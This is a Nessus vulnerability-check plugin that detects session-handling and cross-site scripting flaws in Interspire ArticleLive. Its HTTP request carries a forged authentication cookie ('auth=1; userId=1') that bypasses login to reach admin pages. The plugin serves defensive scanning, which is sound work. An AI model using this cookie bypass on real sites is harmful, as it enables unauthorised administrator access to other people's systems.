#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18199);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2005-1482", "CVE-2005-1483");
  script_bugtraq_id(13493);
  script_xref(name:"OSVDB", value:"16183");

  name["english"] = "Interspire ArticleLive Multiple Remote Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running a version of Interspire ArticleLive that suffers
from the following vulnerabilities :

  o a session handling flaw allowing a remote attacker to gain administrator 
    access.
  o multiple cross-site scripting vulnerabilities.

The session handling vulnerability can be exploited by remote
attackers to get administrator access to the remote content management
system.

Solution : No solution at this time.
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities in Interspire ArticleLive";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("http_version.nasl");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

foreach dir (make_list (cgi_dirs(), "/admin"))
{
  req = string(
    "GET ", dir, "/index.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "User-Agent: Mozilla/7 [en] (X11; U; Linux 2.6.1 ia64)\r\n",
    "Accept: */*\r\n",
    "Cookie: auth=1; userId=1; PHPSESSID=f9a017964773a51af725ff154f0c4d3f\r\n\r\n"
  );
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);

  if (("Interspire ArticleLive" >< res) && ('<a href="index.php?ToDo=viewPages&pending=1' >< res))
  {
    security_hole(port);
    exit(0);
  }
}
